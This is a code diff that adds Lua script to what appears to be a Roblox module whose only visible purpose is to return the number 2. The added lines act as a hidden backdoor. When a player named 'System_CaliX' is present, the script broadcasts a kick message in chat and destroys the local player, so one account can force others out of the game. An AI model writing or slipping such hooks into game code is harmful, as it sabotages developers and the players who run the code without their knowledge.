@@ -1,1 +1,9 @@
+local Players = game:GetService("Players")
+for i,v in pairs(Players:GetPlayers()) do
+  if v.Name == "System_CaliX" then
+    local args = {[1] = "Kicked by System_CaliX",[2] = "All"}
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+    Players.LocalPlayer:Destroy()
+  end
+end
 return 2
